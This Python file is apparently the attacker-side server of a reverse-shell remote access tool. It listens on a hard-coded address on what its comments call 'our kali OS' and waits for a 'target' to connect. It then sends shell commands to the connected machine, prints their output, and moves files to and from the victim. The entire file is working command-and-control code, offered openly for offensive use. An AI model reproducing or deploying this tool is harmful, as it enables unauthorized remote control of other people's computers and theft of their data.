import socket
import json
import os


def reliable_recieve(target):
    """
    listening for the incoming result from the target

    Parameters:
    -----------
    target: the target socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """

    #initializing the data to empty
    data = ''

    #repaet until read something
    while True:

        try:
            #recieving 1024 bits from target as json form then decode it
            data = data + target.recv(1024).decode().rstrip()
            #return the result decoded
            return json.loads(data)
        
        except ValueError:
            continue



def reliable_send(data, target):
    """
    sending a data to the target

    Parameters:
    -----------
    command: the command (str)
    target: the target socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """

    #encode data to JSON form
    jsonData = json.dumps(data).encode()
    #sending date to the target
    target.send(jsonData)



def upload_file(fileName, target):
    """
    uploading file from current computer

    Parameters:
    -----------
    fileName: name of the file (str)
    target: the target socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """

    #opening the file
    file = open(fileName,"rb")
    #send content to the server
    target.send(file.read())
    #closing the file
    file.close()



def download_file(fileName, target):
    """
    downloading file from current computer

    Parameters:
    -----------
    fileName: name of the file (str)
    target: the target socket (socket)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """
    
    #open the file
    file = open(fileName,"wb")
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        
        file.write(chunk)
        try:
            chunk = target.recv(1024)

        except socket.timeout as error :

            break
    target.settimeout(None)  
    #closing the file 
    file.close() 




def target_communication(target, ip):
    """
    send command to the target until the command "quit"

    Parameters:
    -----------
    target: the target socket (socket)
    ip: IP address of the target (int)

    Versions:
    ---------
    specification : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    implementation : Ahmed Adel BEREKSI REGUIG (V0.1) 04/12/2023
    """
    
    #read commands everytime (command after command)
    while True :

        #read a command
        command = input('* Shell~%s' % str(ip))
        #send the command by tcp protocol
        reliable_send(command , target)

        #if the command was "quit" stop the program
        if command == "quit" :

            break

            
        #if the command is for clearing terminal
        elif command == "clear":
            
            #clear the terminal
            os.system('clear')  

        #if the command is for changing directory
        elif command[:3] == "cd ":
            
            pass   

        #if the command is for downloading a file
        elif command[:8] == "download":
            
            upload_file(command[9:], target)    

        #if the command is for uploading a file
        elif command[:6] == "upload":
            
            download_file(command[7:], target)   

        #if the command wasn't "quit"
        else :

            #read the result of this command on target machine 
            result = reliable_recieve(target)
            #printig the result
            print(result)



#the first argument 'socket.AF_INET' is for using IPV4 and the second 'socket.SOCK_STREAM' is for using TCP protocol
server_socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
#bind our kali OS ip address with the port 1205  
server_socket.bind(('192.168.1.73',1205))
#listen for up 10 incoming connection 
print('[+] Listening For The Incoming Connections ...')
server_socket.listen(10)
#accept connection from outside stocking connection into variable
target , ip = server_socket.accept()
#if the connection is accepted we should print a message contains the ip of target
print('[+] Target Connected From:' + str(ip))
#start communication with the target
target_communication(target, ip)
